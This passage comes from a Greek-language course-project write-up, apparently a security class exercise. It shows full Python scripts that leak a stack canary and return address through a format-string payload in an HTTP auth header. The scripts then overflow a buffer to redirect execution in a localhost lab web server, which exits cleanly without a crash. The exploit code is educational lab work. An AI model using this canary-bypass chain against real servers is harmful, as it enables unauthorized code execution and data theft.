      ret_addr = text_obj[-1]

      offset_srv_ulti = 0x145

      canary   = struct.pack('<L', int(canary  , base=16))
      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
      srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)

      binary_payload = BytesIO()
      binary_payload.write(("p" * 100).encode("utf-8"))
      binary_payload.write(canary)
      binary_payload.write(("p" * 8).encode("utf-8"))
      binary_payload.write(svd_ebp)
      binary_payload.write(srv_ulti)

      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
      url = 'http://localhost:' + argv[1] + '/ultimate.html'
      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)

      print(response.text)
      ```

      </p>
   </details>
<br/>

10. Ωστόσο, παρατηρήσαμε ότι καθυστερεί υπερβολικά να στείλει την απάντηση και τρέχοντας το τοπικά, είδαμε ότι αλλάζοντας απλά το return 
    address της `check_auth()` ώστε να πάει κατευθείαν στην **κλήση** της **`serve_ultimate()`**, τότε προκύπτει **SIGSEGV**, το οποίο οφείλεται 
    στο ότι η `serve_ultimate()` επιστρέφει κανονικά στην **`route()`** και όταν φτάνει στη γραμμή main.c:**63** όπου γίνεται το **`free()`**, 
    το όρισμα της (**given_pwd**) που θα αρχικοποιούνταν αμέσως μετά την κανονική επιστροφή της `post_param()`, δεν έχει τελικά αρχικοποιηθεί και έτσι
    έχοντας μια τυχαία τιμή προκύπτει το ***segmentation fault***.
    
    ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/24-Serve_Ultimate_SIGSEGV.png)
    
    Κάνοντας kill το process που εξυπηρετούσε το τρέχον request, στέλνεται το περιεχόμενο του _ultimate.html_, κάτι που σημαίνει ότι έχουν σταλεί 
    τα δεδομένα στο pipeline, αλλά δεν έχει γίνει flush ο buffer του stdout και γι'αυτό δεν έρχονται άμεσα οι απαντήσεις.    
<br/>

11. Έτσι, βρήκαμε έναν εναλλακτικό τρόπο να πάρουμε το αρχείο χωρίς να χαλάσει η ροή της υπόλοιπης εκτέλεσης. 

    Υπολογίσαμε νέα offsets μεταξύ της πρώτης εντολής της **`serve_ultimate()`** και της πραγματικής return address της `check_auth()` έτσι ώστε 
    να μπορέσουμε να ελέγξουμε και το που θα επιστρέψει η `serve_ultimate()` μόλις ολοκληρωθεί, κάτι που δε γίνεται αν χρησιμοποιήσουμε την κλήση 
    της συνάρτησης μέσω της εντολής `call`, γιατί η εντολή αυτή κάνει push το πραγματικό return address της εκάστοτε συνάρτησης που καλεί, κάτι 
    που δεν μπορούμε να αλλάξουμε, εφόσον γίνεται σε μεταγενέστερο χρόνο από το BOF.
 
    |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
    |-|-|
    |1η εντολή της `serve_ultimate()` | **0x870** |
    |Επιστροφή της `serve_ultimate()` παρακάμπτοντας την `free()` | **0x169**|
    
    ```python
    ...
    binary_payload = BytesIO()
    binary_payload.write(("p" * 100).encode("utf-8"))
    binary_payload.write(canary)
    binary_payload.write(("p" * 8).encode("utf-8"))
    binary_payload.write(svd_ebp)
    binary_payload.write(srv_ulti)
    binary_payload.write(safe_ret)
    ...
    ```
    <details>
    <summary><b>Click here to see the full script</b></summary>
       <p>

       ```python
       import pycurl
       import struct
       import base64
       import requests
 
       from sys import argv
       from io  import BytesIO
 
       # Sending 1st payload to / for getting the canary value and
       # the return address of check_auth() from reposnse headers
       url = 'http://localhost:' + argv[1] + '/'
 
       username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
       input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
       response = requests.request("GET", url, headers=input_headers)
       text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
 
       # Building the payload
       canary   = text_obj[-3]
       ebp      = text_obj[-2]
       ret_addr = text_obj[-1]
      
       offset_srv_ulti = 0x870
       offset_safe_ret = 0x169 
 
       canary   = struct.pack('<L', int(canary  , base=16))
       svd_ebp  = struct.pack('<L', int(ebp     , base=16))
       srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)
       safe_ret = struct.pack('<L', int(ret_addr, base=16) + offset_safe_ret)
 
       binary_payload = BytesIO()
       binary_payload.write(("p" * 100).encode("utf-8"))
       binary_payload.write(canary)
       binary_payload.write(("p" * 8).encode("utf-8"))
       binary_payload.write(svd_ebp)
       binary_payload.write(srv_ulti)
       binary_payload.write(safe_ret)
 
       # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
       url = 'http://localhost:' + argv[1] + '/ultimate.html'
       authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
       headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
       response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
 
       print(response.text)
       ```
 
       </p>
    </details><br/>
    
    Ετσι, πετύχαμε να παίρνουμε το **ultimate.html** άμεσα και να κάνουμε το παιδί να τερματίζει ομαλά χωρίς να αφήνουμε κάποιο ίχνος όπως ένα segmentation fault.
    
    Μέσω αυτού λοιπόν, βρήκαμε τις πληροφορίες για τα ***Preliminary Results of Plan Y***!
    
    &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/25-Ultimate_Data.png)


   
   

## References

<h5><sup>[1]</sup>  https://www.robotstxt.org/robotstxt.html</h5>
<h5><sup>[2]</sup>  https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf#page=33</h5>
<h5><sup>[3]</sup>  https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016</h5>
<h5><sup>[4]</sup>  https://stackoverflow.com/questions/6916805/why-does-a-base64-encoded-string-have-an-sign-at-the-end</h5>
<h5><sup>[5]</sup>  https://owasp.org/www-community/attacks/Format_string_attack</h5>
<h5><sup>[6]</sup>  https://cs155.stanford.edu/papers/formatstring-1.2.pdf#page=11</h5>
<h5><sup>[7]</sup>  https://www.cvedetails.com/vulnerability-list/vendor_id-72/product_id-960/version_id-219995/GNU-GCC-5.4.html</h5>
<h5><sup>[8]</sup>  https://ctf101.org/binary-exploitation/stack-canaries/#bruteforcing-a-stack-canary</h5>
<h5><sup>[9]</sup>  https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries</h5>
<h5><sup>[10]</sup>  https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf</h5>
<h5><sup>[11]</sup>  http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf</h5>
<h5><sup>[12]</sup>  https://uaf.io/exploitation/2015/09/29/Stack-CANARY-Overwrite-Primer.html</h5>
